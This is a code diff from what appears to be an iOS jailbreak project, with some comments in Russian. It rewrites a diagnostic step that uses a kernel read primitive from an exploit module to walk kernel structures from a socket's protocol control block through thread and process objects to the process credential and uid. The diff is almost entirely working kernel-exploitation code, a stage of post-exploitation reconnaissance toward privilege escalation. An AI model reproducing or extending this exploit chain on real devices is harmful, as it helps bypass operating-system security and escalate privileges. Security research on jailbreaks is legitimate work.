@@ -16,6 +16,7 @@
 #import <libjailbreak/translation.h>
 
 #import "exploit/kutils.h"
+#import "exploit/kexploit_opa334.h"  // darksword_rw_socket_pcb()
 #import "exploit/offsets.h"
 #import "TaskRop/pac.h"   // off_proc_ro_pr_task / off_task_map
 
@@ -212,48 +213,84 @@ static const char *scopeTypeName(uint8_t t) {
                   (unsigned)koffsetof(pmap, ttep),
                   (unsigned)koffsetof(vm_map_entry, next)]);
 
-    // ---- 4. ucred via proc_self() ONLY (early_kread, soft-fail) ----
-    // findSelfProcByComm / zoneRoute chase the allproc list with the RAW
-    // kreadbuf (icmp6filt) — that is the reboot class. proc_self() uses
-    // early_kread which refuses bad kaddrs and returns 0 instead of panicking.
-    // Run #1 survived with exactly this shape. No walk, no vtophys.
-    [r appendString:@"\n--- ucred (proc_self, soft-fail) ---\n"];
+    // ---- 4. ucred: diagnostic hop chain (inpcb -> socket -> thread -> proc) ----
+    // proc_self() returns 0 with no visibility. Walk the same chain ourselves
+    // with a kernel-shape check and a log line per hop. NO allproc walk,
+    // NO zoneRoute. Each read is on a pointer just validated from the hop above.
+    [r appendString:@"\n--- ucred: hop chain (rwSocketPcb) ---\n"];
     {
-        uint64_t selfProc = proc_self();
-        scopeNote(r, [NSString stringWithFormat:@"  proc_self() = 0x%016llx",
-                      (unsigned long long)selfProc]);
-
-        // Hard stop if proc_self failed — do NOT fall through to zoneRoute.
-        if (!selfProc || ((selfProc & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL)) {
-            scopeNote(r, @"  proc_self() unavailable (soft-fail) — skipping ucred reads.");
-            scopeNote(r, @"  (This is the run #1 shape; device stays up.)");
+        uint64_t pcb = darksword_rw_socket_pcb();
+        scopeNote(r, [NSString stringWithFormat:@"  rwSocketPcb = 0x%016llx",
+                      (unsigned long long)pcb]);
+        if (!pcb || ((pcb & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL)) {
+            scopeNote(r, @"  rwSocketPcb пуст/мусор — эксплойт не выставил inpcb. Стоп.");
         } else {
-            uint64_t procRo = 0, ucred = 0;
-            uint64_t raw = 0;
-            gPrimitives.kreadbuf(selfProc + off_proc_p_proc_ro, &raw, 8);
-            procRo = kp_untag_ptr(raw);
-            scopeNote(r, [NSString stringWithFormat:@"  p_proc_ro = 0x%016llx",
-                          (unsigned long long)procRo]);
-
-            if ((procRo & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+            uint64_t h1 = 0, h2 = 0, h3 = 0, h4 = 0, raw = 0;
+            // hop 1: inpcb -> socket
+            gPrimitives.kreadbuf(pcb + off_inpcb_inp_socket, &raw, 8);
+            h1 = kp_untag_ptr(raw);
+            scopeNote(r, [NSString stringWithFormat:@"  hop1 inpcb.socket   = 0x%016llx  (raw 0x%016llx)",
+                          (unsigned long long)h1, (unsigned long long)raw]);
+            if ((h1 & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL) {
+                scopeNote(r, @"  hop1 не kernel ptr — стоп.");
+            } else {
+                // hop 2: socket -> background_thread
                 raw = 0;
-                gPrimitives.kreadbuf(procRo + off_proc_ro_p_ucred, &raw, 8);
-                ucred = kp_untag_ptr(raw);
-                scopeNote(r, [NSString stringWithFormat:@"  p_ucred   = 0x%016llx",
-                              (unsigned long long)ucred]);
-            }
-            if ((ucred & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
-                uint64_t uid = 0;
-                gPrimitives.kreadbuf(ucred + 0x18, &uid, 8);
-                scopeNote(r, [NSString stringWithFormat:@"  ucred+0x18 (uid cluster) = 0x%016llx",
-                              (unsigned long long)uid]);
+                gPrimitives.kreadbuf(h1 + off_socket_so_background_thread, &raw, 8);
+                h2 = kp_untag_ptr(raw);
+                scopeNote(r, [NSString stringWithFormat:@"  hop2 sock.bg_thread = 0x%016llx  (raw 0x%016llx)",
+                              (unsigned long long)h2, (unsigned long long)raw]);
+                if ((h2 & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL) {
+                    scopeNote(r, @"  hop2 не kernel ptr — стоп (thread может быть не наш).");
+                } else {
+                    // hop 3: thread -> thread_ro
+                    raw = 0;
+                    gPrimitives.kreadbuf(h2 + off_thread_t_tro, &raw, 8);
+                    h3 = kp_untag_ptr(raw);
+                    scopeNote(r, [NSString stringWithFormat:@"  hop3 thread.tro     = 0x%016llx  (raw 0x%016llx)",
+                                  (unsigned long long)h3, (unsigned long long)raw]);
+                    if ((h3 & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL) {
+                        scopeNote(r, @"  hop3 не kernel ptr — стоп.");
+                    } else {
+                        // hop 4: thread_ro -> proc
+                        raw = 0;
+                        gPrimitives.kreadbuf(h3 + off_thread_ro_tro_proc, &raw, 8);
+                        h4 = kp_untag_ptr(raw);
+                        scopeNote(r, [NSString stringWithFormat:@"  hop4 tro.proc       = 0x%016llx  (raw 0x%016llx)",
+                                      (unsigned long long)h4, (unsigned long long)raw]);
+                        if ((h4 & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                            // ucred via proc_ro
+                            uint64_t procRo = 0, ucred = 0;
+                            raw = 0;
+                            gPrimitives.kreadbuf(h4 + off_proc_p_proc_ro, &raw, 8);
+                            procRo = kp_untag_ptr(raw);
+                            scopeNote(r, [NSString stringWithFormat:@"  p_proc_ro           = 0x%016llx",
+                                          (unsigned long long)procRo]);
+                            if ((procRo & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                raw = 0;
+                                gPrimitives.kreadbuf(procRo + off_proc_ro_p_ucred, &raw, 8);
+                                ucred = kp_untag_ptr(raw);
+                                scopeNote(r, [NSString stringWithFormat:@"  p_ucred             = 0x%016llx",
+                                              (unsigned long long)ucred]);
+                            }
+                            if ((ucred & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                uint64_t uid = 0;
+                                gPrimitives.kreadbuf(ucred + 0x18, &uid, 8);
+                                scopeNote(r, [NSString stringWithFormat:@"  ucred+0x18 uid      = 0x%016llx",
+                                              (unsigned long long)uid]);
+                            }
+                        } else {
+                            scopeNote(r, @"  hop4 не kernel ptr — стоп.");
+                        }
+                    }
+                }
             }
         }
     }
 
     // ---- 5. Verdict ----
     [r appendString:@"\n--- verdict (safe+ucred) ---\n"];
-    scopeNote(r, @"  proc_self soft-fail only. NO findSelfProcByComm, NO zoneRoute, NO walk, NO vtophys.");
+    scopeNote(r, @"  hop-chain diagnostic (rwSocketPcb). NO allproc, NO zoneRoute, NO walk, NO vtophys.");
     scopeNote(r, @"  Deep recon (ucred FTE + vm_map_entry walk) is deferred until");
     scopeNote(r, @"  the panic source is isolated. Flags above are the R5c result.");
     scopeNote(r, @"  (No kernel writes performed.)");
